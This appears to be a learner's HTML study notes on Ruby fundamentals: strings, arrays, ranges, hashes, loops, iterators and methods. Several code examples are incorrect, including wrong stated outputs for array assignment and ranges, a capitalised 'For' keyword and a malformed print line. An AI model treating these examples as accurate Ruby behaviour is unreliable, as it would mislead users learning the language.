<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">st</span> <span class="o">=</span> <span class="s2">"bcde"</span>
<span class="n">st</span><span class="p">.</span><span class="nf">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">"a"</span><span class="p">)</span>
<span class="c1"># Output: abcde</span>
</code></pre></div></div>

<blockquote>
  <p>-3, it works like python. It counts from the end.</p>
</blockquote>

<h4 id="interpolation">Interpolation</h4>
<ul>
  <li>Allows to write Ruby code into a string. This means you can put any code you want to run enclosed in</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby#{}
</code></pre></div></div>

<p>And result of the code will appear in the string:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"string </span><span class="si">#{</span><span class="no">Ruby</span> <span class="n">code</span><span class="si">}</span><span class="s2"> string"</span>
<span class="ss">example:

</span><span class="c1">#{2*4} apples on the tree</span>
 <span class="c1"># Output: "8 apples on the tree"</span>

<span class="nb">name</span> <span class="o">=</span><span class="s2">"john"</span>
<span class="c1"># Output: "My name is #{name}" </span>
<span class="c1"># just like python fstring</span>
</code></pre></div></div>
<h4 id="some-useful-methods">Some useful methods</h4>
<ul>
  <li>Sometimes you may have to do some simple operations with text or string</li>
  <li>upcase, capitalize, reverse, and so on</li>
</ul>

<h2 id="array">Array</h2>
<ul>
  <li>A Ruby array is an object that contains other objects which can be accessed using integer indexes. An array can include all type of objects, including other arrays (this is called multidimensional array).</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">my_array</span> <span class="o">=</span> <span class="no">Array</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">my_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">my_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">9</span>
<span class="n">my_array</span>
<span class="c1"># Output: [5,9]</span>
<span class="n">my_array</span><span class="o">&lt;&lt;</span><span class="mi">7</span> 
<span class="n">my_array</span>
<span class="c1"># Output: [5,9,7]</span>
</code></pre></div></div>

<p>// it can be accessed through indexes
// it can have multi layers of arrays
// by changing a variable inside the array, it also changes the array/variable and vice versa</p>

<h3 id="insertions">Insertions</h3>
<ul>
  <li>it can be done via ‘«’ operator // like bash</li>
  <li>also with ranges [..]</li>
</ul>

<h3 id="deletion">Deletion</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span><span class="p">.</span><span class="nf">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> 
<span class="c1"># through element</span>

<span class="n">a</span><span class="p">.</span><span class="nf">delete_at</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> 
<span class="c1"># through index position</span>
</code></pre></div></div>

<h3 id="concatenation">concatenation</h3>
<ul>
  <li>You can concatenate arrays with <strong>+</strong> operator or an OO style with <strong>.concat</strong> method.</li>
</ul>

<h3 id="operations-between-arrays">Operations between arrays</h3>
<p>You can treat an array as a set and perform operations like:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Union ( | ): concatenates two arrays (removing duplicates)</span>
<span class="c1"># Intersection ( &amp; ): Only elements that are common to both arrays are returned (removing duplicates)</span>
<span class="c1"># Difference ( - ): returns the first array without the elements contained into the second array</span>

<span class="c1"># Example:</span>

<span class="n">arr1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
<span class="n">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">]</span>

<span class="c1"># Union (|)</span>
<span class="n">union_result</span> <span class="o">=</span> <span class="n">arr1</span> <span class="o">|</span> <span class="n">arr2</span>
<span class="nb">puts</span> <span class="s2">"Union: </span><span class="si">#{</span><span class="n">union_result</span><span class="si">}</span><span class="s2">"</span>

<span class="c1"># Intersection (&amp;)</span>
<span class="n">intersection_result</span> <span class="o">=</span> <span class="n">arr1</span> <span class="o">&amp;</span> <span class="n">arr2</span>
<span class="nb">puts</span> <span class="s2">"Intersection: </span><span class="si">#{</span><span class="n">intersection_result</span><span class="si">}</span><span class="s2">"</span>

<span class="c1"># Difference (-)</span>
<span class="n">difference_result</span> <span class="o">=</span> <span class="n">arr1</span> <span class="o">-</span> <span class="n">arr2</span>
<span class="nb">puts</span> <span class="s2">"Difference: </span><span class="si">#{</span><span class="n">difference_result</span><span class="si">}</span><span class="s2">"</span>

<span class="c1"># Output:</span>
<span class="c1"># Union: [1, 2, 3, 4, 5]</span>
<span class="c1"># Intersection: [3]</span>
<span class="c1"># Difference: [1, 2]</span>

</code></pre></div></div>

<h3 id="stack">stack</h3>
<ul>
  <li>Ruby arrays provide <strong>push</strong> and <strong>pop</strong> methods</li>
</ul>

<h3 id="some-useful-methods-1">Some useful methods</h3>
<p>Moreover the array class provides a lot of interesting and useful methods such as:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sort</span>
<span class="n">reverse</span>
<span class="n">uniq</span>
<span class="n">max</span>
<span class="n">min</span>
</code></pre></div></div>

<ul>
  <li>Note that some methods come both with and without the exclamation point ( ! )</li>
  <li>so when its done, also affects the original variable/object</li>
</ul>

<h3 id="arrays-and-strings">Arrays and Strings</h3>
<ul>
  <li>You can easily create a String starting from an Array (and vice versa) using the <strong>join</strong> method.</li>
  <li>and to create an array starting from a String using the <strong>split</strong> method // just like python</li>
</ul>

<p>→ moreover: http://www.ruby-doc.org/core-1.9.3/Array.html</p>

<h3 id="references">References</h3>
<p>→  http://www.ruby-doc.org/core-1.9.3/</p>

<h2 id="ranges-and-hash">Ranges and Hash</h2>

<ul>
  <li>Ruby Ranges allows data to be represented in the form of a range. You can create different ranges of values: numbers, characters, strings or objects in general</li>
  <li>A range is made of a start value, an and value and a range of values in between.</li>
</ul>

<p>Two ways to create ranges:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">the</span> <span class="n">inclusive</span> <span class="p">(</span><span class="n">a</span><span class="o">..</span><span class="n">b</span><span class="p">)</span> 
<span class="c1"># 2 dots - it includes all values</span>
<span class="n">the</span> <span class="n">exclusive</span> <span class="p">(</span><span class="n">a</span><span class="o">...</span><span class="n">b</span><span class="p">)</span> 
<span class="c1"># 3 dots - it excludes the last value (in this case 'b')</span>
</code></pre></div></div>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="mi">2</span><span class="o">..</span><span class="mi">4</span><span class="p">).</span><span class="nf">to_a</span> <span class="sr">//</span> <span class="nb">to_a</span> <span class="o">=</span> <span class="n">means</span> <span class="n">to</span> <span class="n">array</span>
<span class="c1"># Output: [2,3,4]</span>

<span class="p">(</span><span class="mi">2</span><span class="o">...</span><span class="mi">4</span><span class="p">).</span><span class="nf">to_a</span>
<span class="c1"># Output: [2,3]</span>

<span class="c1"># the same with letters</span>
<span class="c1"># differents data types supports differents methods</span>

<span class="n">example</span> <span class="ss">float:
</span><span class="p">(</span><span class="mf">1.0</span><span class="o">..</span><span class="mf">3.0</span><span class="p">).</span><span class="nf">step</span><span class="p">.</span><span class="nf">to_a</span> <span class="sr">//</span><span class="n">without</span> <span class="n">step</span> <span class="n">it</span> <span class="n">bugs</span>
<span class="c1"># Output: [1.0, 2.0, 3.0]</span>
</code></pre></div></div>

<p>Another methods:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">min</span>
<span class="n">max</span>
<span class="k">begin</span>
<span class="k">end</span>
<span class="n">etc</span>
</code></pre></div></div>

<p>You can check if a value belongs to the range using the <strong>include</strong> method or the <strong>===</strong> operator</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="mi">2</span><span class="o">..</span><span class="mi">10</span><span class="p">).</span><span class="nf">include?</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="c1"># Output: true</span>

<span class="p">(</span><span class="mi">2</span><span class="o">..</span><span class="mi">10</span><span class="p">)</span> <span class="o">===</span> <span class="p">(</span><span class="mi">14</span><span class="p">)</span>
<span class="c1"># Output: false</span>
</code></pre></div></div>

<blockquote>
  <p>Ranges can be expressed using variables too</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">b</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">a</span><span class="o">..</span><span class="n">b</span>
 <span class="c1"># Output: 5..10</span>

<span class="p">(</span><span class="n">a</span><span class="o">..</span><span class="n">b</span><span class="p">).</span><span class="nf">to_a</span>
 <span class="c1"># Output: [5,6,7,8,9]</span>
</code></pre></div></div>

<h3 id="hashes">Hashes</h3>
<ul>
  <li>similar to arrays. The main difference is that hashes are like dictionaries, so instead of using integer indexes</li>
</ul>

<p>You can use an object index as key:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">character</span>
<span class="n">string</span>
<span class="n">regex</span>
<span class="n">symbols</span>
<span class="ow">and</span> <span class="n">so</span> <span class="n">on</span>
</code></pre></div></div>

<ul>
  <li>Obviously the value of an hash element can be of any type</li>
  <li>to define a hash you must use <strong>{}</strong> instead of <strong>[]</strong></li>
  <li>
    <p>The inline syntax allows you to create an hash very quickly using the operator <strong>=&gt;</strong>. The value on the left of the operator is the object index while what follows is its values.</p>
  </li>
  <li>To avoid quotes in hash keys, Ruby allows symbols based key values:</li>
</ul>

<p>→ http://ruby-doc.org/core-1.9.3/Symbol.html</p>

<ul>
  <li>
    <p>Symbols are a particular feature in Ruby. Generally they are a data type, but Ruby handles them in a special way.</p>
  </li>
  <li>
    <p>A simple way to use them is by adding a colon (:) before the key name (that becomes a symbol).</p>
  </li>
</ul>

<p>Note that there are no quotes:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span><span class="ss">:name</span> <span class="o">=&gt;</span> <span class="s1">'Bob'</span><span class="p">,</span> <span class="ss">:age</span> <span class="o">=&gt;</span> <span class="mi">25</span><span class="p">,</span> <span class="ss">:gender</span> <span class="o">=&gt;</span> <span class="s1">'M'</span><span class="p">}</span>
<span class="nb">hash</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span>
<span class="c1"># Output: "Bob"</span>

<span class="no">Can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">a</span> <span class="n">rapid</span> <span class="n">notation</span> <span class="p">(</span><span class="no">KEY</span><span class="ss">:VALUE</span><span class="p">)</span>
 <span class="err">→</span> <span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span><span class="ss">name: </span><span class="s1">'Bob'</span><span class="p">,</span> <span class="n">age</span><span class="p">:</span><span class="mi">25</span><span class="p">,</span> <span class="n">gender</span><span class="ss">:'M'</span><span class="p">}</span>
<span class="c1"># but does not work For integer key value</span>
</code></pre></div></div>

<p>→ moreover: http://www.ruby-doc.org/core-1.9.3/Hash.html</p>

<h2 id="basic-control-structures">Basic Control Structures</h2>
<p>→  http://ruby-doc.org/docs/keywords/1.9/Object.html</p>

<h3 id="comparison-operator">Comparison Operator</h3>

<table>
  <tbody>
    <tr>
      <td>operator</td>
      <td>description</td>
    </tr>
    <tr>
      <td>==</td>
      <td>Equality operator</td>
    </tr>
    <tr>
      <td>.eql?</td>
      <td>Equality operator (OO style)</td>
    </tr>
    <tr>
      <td>!=</td>
      <td>Inequality operator</td>
    </tr>
    <tr>
      <td>&lt;</td>
      <td>less than</td>
    </tr>
    <tr>
      <td>&gt;</td>
      <td>greater than</td>
    </tr>
    <tr>
      <td>&lt;=</td>
      <td>less than or equal to</td>
    </tr>
    <tr>
      <td>&gt;=</td>
      <td>greater than or equal to</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>a &lt;=&gt; b</td>
    </tr>
    <tr>
      <td>0 - if a == b</td>
    </tr>
    <tr>
      <td>1 - if a &gt; b</td>
    </tr>
    <tr>
      <td>-1 - if a &lt; b</td>
    </tr>
  </tbody>
</table>

<h3 id="conditionals">Conditionals</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">5</span> <span class="k">then</span>
  <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">greater than 5</span><span class="se">\n\n</span><span class="s2">"</span>
<span class="k">end</span>
<span class="k">if</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">20</span>
  <span class="nb">puts</span> <span class="s2">"less than 20</span><span class="se">\n\n</span><span class="s2">"</span>
<span class="k">end</span>

<span class="c1"># we can use else also</span>
<span class="c1"># and elsif // like python</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x</span> <span class="o">=</span> <span class="mi">10</span>
<span class="nb">puts</span> <span class="s2">"x is integer </span><span class="se">\n</span><span class="s2">"</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="nf">is_a?</span> <span class="no">Integer</span>
<span class="c1"># Output: x is integer</span>
</code></pre></div></div>

<ul>
  <li>Everything is an expression. Expressions like print or puts have a return value too (nil in this case is)</li>
</ul>

<h3 id="unless">Unless</h3>
<ul>
  <li>THe unless steatment is the opposite of if. It executes the associated code only if the conditional expressoin return false or nil.</li>
</ul>

<h3 id="case">Case</h3>
<ul>
  <li>The case statements is a valid substitute For if/elsif</li>
  <li>It tests in order each when clause until it finds a condition that returns true; otherwise the final else is executed.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x</span><span class="o">=</span><span class="mi">1</span>
<span class="k">case</span> <span class="n">x</span>
<span class="k">when</span> <span class="mi">1</span> <span class="k">then</span> <span class="nb">print</span> <span class="s2">"one"</span>
<span class="k">else</span> <span class="nb">print</span> <span class="s2">"I dont know"</span>
<span class="k">end</span>

<span class="n">x</span><span class="o">=</span><span class="mi">1</span>
<span class="nb">name</span> <span class="o">=</span> <span class="k">case</span> <span class="n">x</span>
<span class="k">when</span> <span class="mi">1</span> <span class="k">then</span> <span class="nb">print</span> <span class="s2">"maria"</span>
<span class="k">else</span> <span class="nb">print</span> <span class="s2">"I dont know"</span>
<span class="k">end</span>

<span class="n">x</span><span class="o">=</span><span class="mi">1</span>
<span class="nb">name</span> <span class="o">=</span> <span class="k">case</span>
<span class="k">when</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">then</span> <span class="nb">print</span> <span class="s2">"luna"</span>
<span class="k">else</span> <span class="nb">print</span> <span class="s2">"I dont know"</span>
<span class="k">end</span>
</code></pre></div></div>

<ul>
  <li>The equality operator <strong>===</strong> is useful to work in Ranges.</li>
</ul>

<p>With Classes and Instances too:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">String</span> <span class="o">==</span> <span class="s2">"Hello"</span>
<span class="c1"># Output: false</span>
<span class="no">String</span> <span class="o">===</span> <span class="s2">"Hello"</span>
<span class="c1"># Output: true</span>
</code></pre></div></div>

<h3 id="ternary-operator">Ternary Operator</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;</span> <span class="n">test_expr?</span> <span class="n">true_expr</span> <span class="p">:</span> <span class="n">false_expr</span>
<span class="o">&gt;&gt;</span> <span class="nb">name</span> <span class="o">==</span> <span class="s2">"Bob"</span> <span class="p">?</span> <span class="s2">"Hi Bob"</span> <span class="p">:</span> <span class="s2">"Who are you?"</span>
</code></pre></div></div>

<h3 id="loops">Loops</h3>
<p>While:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span>
  <span class="o">&lt;..</span><span class="n">block</span><span class="o">&gt;</span> 
<span class="k">end</span>
</code></pre></div></div>

<blockquote>
  <p>the keyword <strong>do</strong> is required with inline basic while statement instead</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print</span> <span class="n">i</span><span class="o">+=</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"</span><span class="se">\s</span><span class="s2">"</span> <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span>

<span class="nb">print</span> <span class="n">array</span><span class="p">.</span><span class="nf">pop</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span> <span class="k">while</span> <span class="o">!</span><span class="n">array</span><span class="p">.</span><span class="nf">empty?</span>
</code></pre></div></div>

<p>Until:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">until</span> <span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="n">block</span><span class="o">&gt;</span>
<span class="k">end</span>
</code></pre></div></div>

<blockquote>
  <p>the keyword <strong>do</strong> is required with inline basic while statement instead</p>
</blockquote>

<p>For:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="o">&lt;</span><span class="n">var</span><span class="o">&gt;</span> <span class="k">in</span> <span class="o">&lt;</span><span class="n">collection</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="n">block</span><span class="o">&gt;</span>
<span class="k">end</span>

<span class="k">for</span> <span class="n">x</span> <span class="k">in</span> <span class="p">[</span><span class="mi">10</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span> <span class="k">do</span>
  <span class="nb">print</span> <span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">.</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span>
<span class="k">end</span>

<span class="o">-</span> <span class="n">with</span> <span class="n">range</span>
<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="mi">10</span>
  <span class="nb">print</span> <span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="iterators">Iterators</h3>
<p>Its a method that allows you to loop through the members of a colletion:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">5</span><span class="p">).</span><span class="nf">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span> <span class="nb">print</span> <span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">}</span>
<span class="c1"># Output: 2 4 6 8 10</span>

<span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">5</span><span class="p">).</span><span class="nf">each</span>  <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
  <span class="nb">print</span> <span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span>
<span class="c1"># Output: 2 4 6 8 10</span>
</code></pre></div></div>

<h3 id="enumerable-objects">Enumerable Objects</h3>
<ul>
  <li>other common enumerable objects are Arrays, Hashes and Ranges.</li>
  <li>stataments like collect/map, select, reject, inject are iterators too</li>
  <li>each of them can be used either to modify the original collection (just append the exclamation mark ! at the end of the method) or to create a new collection starting from the original.</li>
</ul>

<p><strong>collect/map</strong> statements are synonymous:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">array</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>
<span class="n">array</span><span class="p">.</span><span class="nf">map</span> <span class="p">{</span><span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">}</span>
<span class="c1"># Output: [1,4,9]</span>
</code></pre></div></div>

<p><strong>select</strong> returns an array of the original collection elements For which the associated block returns a positive value (no false, no nil)</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">-</span> <span class="n">array</span><span class="p">.</span><span class="nf">select</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">}</span>
<span class="c1"># Output: 3,4,5</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>reject</strong> is the opposite of select. it returns an array of original collection elements For which the associated block returns a false or nil.</p>
  </li>
  <li>
    <p><strong>inject</strong> - The block associated to inject has two arguments. the first is an accumulator from previous iteration while the second is the next element of the enumerable object.</p>
  </li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">array</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">]</span>
<span class="n">array</span><span class="p">.</span><span class="nf">inject</span> <span class="p">{</span><span class="o">|</span><span class="n">mul</span><span class="p">,</span><span class="n">x</span><span class="o">|</span> <span class="n">mul</span> <span class="o">*</span> <span class="n">x</span><span class="p">}</span>
 <span class="c1"># Output: 5040</span>
</code></pre></div></div>

<ul>
  <li>the mul its the accumulator, so its gonna save each of the results and keeping multiplying until the list is over</li>
  <li>The value of the accumulator is the initial value of the list, but can be specified with round brackets ( )</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">array</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span>
<span class="n">array</span><span class="p">.</span><span class="nf">inject</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">sum</span><span class="p">,</span><span class="n">x</span><span class="o">|</span> <span class="n">sum</span> <span class="o">+</span> <span class="n">x</span><span class="p">}</span>
 <span class="c1"># Output: 115</span>
</code></pre></div></div>

<h3 id="enumerator">Enumerator</h3>
<ul>
  <li>its an object whose purpose is to enumerate another enumerable object. This means that enumerators are enumerable too.</li>
  <li>when we used each, map, select, etc., we implicitly used enumerators too.</li>
  <li>usage: example, if you have a method that uses an enumerable object, you may not want to pass the enumerable collection object because its mutable and the method may modify it.</li>
  <li>So you can pass an enumerator created with <strong>to_enum</strong> and nothing will happen to the original enumerable collection.</li>
  <li>moreover: http://ruby-doc.org/core-1.9.3/Enumerator.html</li>
</ul>

<h3 id="external-iterators">External Iterators</h3>
<ul>
  <li>There is also the possibility to use an enumerator object as an external iterator.</li>
  <li>Enumerator objects allow you to control the iteration by yourself so you can create what is called external iterator.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">→</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span>
<span class="n">enum</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="nf">to_enum</span>
<span class="n">enum</span><span class="p">.</span><span class="nf">next</span>
<span class="c1"># Output: 1</span>
<span class="n">enum</span><span class="p">.</span><span class="nf">next</span>
 <span class="c1"># Output: 2</span>
<span class="n">enum</span><span class="p">.</span><span class="nf">next</span>
<span class="c1"># Output: 3</span>
<span class="n">enum</span><span class="p">.</span><span class="nf">next</span>
 <span class="c1"># Output: 4</span>
<span class="n">enum</span><span class="p">.</span><span class="nf">next</span>
<span class="c1"># Output: error</span>
</code></pre></div></div>

<h2 id="altering-structured-control-flow">Altering Structured Control Flow</h2>

<p>Like others programming languagues, in Ruby we can use:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">break</span>
<span class="k">next</span>
<span class="k">redo</span>
</code></pre></div></div>

<ul>
  <li><strong>break</strong> transfer the control out of the loop or the iterator where it is contained.</li>
  <li>if true, the next operation is the first statement after the end keyword.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">For</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="mi">10</span>
	<span class="nb">print</span> <span class="n">i</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span>
	<span class="k">break</span> <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="mi">5</span>
<span class="k">end</span>

<span class="c1"># Output:  1 2 3 4 5</span>
</code></pre></div></div>

<ul>
  <li><strong>next</strong> statement ends the current iteration and jumps to the next one. All the instructions that follow are not executed. It works the same way of the continue statement used in Java or C.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">For</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="mi">10</span>
	<span class="k">next</span> <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="mi">5</span>
	<span class="nb">print</span> <span class="n">i</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span>
<span class="k">end</span>

<span class="c1"># Output: 1 2 3 4 6 7 8 9 10</span>
</code></pre></div></div>

<ul>
  <li><strong>Redo</strong> restarts the current iteration from the first instruction in the body of the loop or iteration</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span>
<span class="no">For</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="mi">3</span>
	<span class="n">sum</span> <span class="o">+=</span><span class="n">i</span>
	<span class="k">redo</span> <span class="k">if</span> <span class="n">sum</span> <span class="o">==</span> <span class="mi">1</span>
<span class="k">end</span>

 <span class="c1"># Output: 7</span>
 <span class="c1"># 1 + 1 + 2 + 3 = 7 &gt;&gt; the 1 repeats because of the redo</span>
</code></pre></div></div>

<h3 id="begin--end">Begin / End</h3>
<ul>
  <li>BEGIN allows the execution of Ruby code at the beginning of a Ruby program</li>
  <li>END allows the execution of Ruby code at the end of a Ruby program</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">BEGIN</span> <span class="p">{</span>
  <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"Beginning code"</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
<span class="p">}</span>
<span class="k">END</span> <span class="p">{</span>
  <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"Ending code"</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
<span class="p">}</span>

<span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"Normal code"</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>

</code></pre></div></div>

<p>Output:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">→</span> <span class="no">Beginning</span> <span class="n">code</span>
 <span class="err">→</span> <span class="no">Normal</span> <span class="n">code</span>
 <span class="err">→</span> <span class="no">Ending</span> <span class="n">code</span>
</code></pre></div></div>

<blockquote>
  <p>If there are more than one BEGIN block, they are executed following the order in which the Ruby interpreter encouters them.</p>
</blockquote>

<blockquote>
  <p>END block instead, are executed in the reverse order in which they are encountered</p>
</blockquote>

<h2 id="methods">Methods</h2>

<ul>
  <li>Methods are a common structure - available in all high level programming languages.</li>
  <li>They are used to define code abstraction, providing a specific semantic (what they can do) but hiding the implementation (the code necessary to obtain the semantic)</li>
</ul>

<h3 id="simple-method-definitions">Simple method definitions</h3>
<p>Syntax:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">&lt;</span><span class="nb">method</span> <span class="nb">name</span><span class="o">&gt;</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">arguments</span> <span class="n">list</span><span class="o">&gt;</span><span class="p">)</span>
  <span class="o">...&lt;</span><span class="n">code</span> <span class="n">block</span><span class="o">&gt;...</span>
<span class="k">end</span>
</code></pre></div></div>
<p>// arguments list - can be empty</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">double</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">x</span><span class="o">*</span><span class="mi">2</span>
<span class="k">end</span>

<span class="n">double</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="c1"># Output: 4</span>
</code></pre></div></div>

<h3 id="parentheses">Parentheses</h3>
<p>Ruby is flexible, it allows parentheses to be omitted when you invoke a method ( a space os required between the method name and the argument)</p>
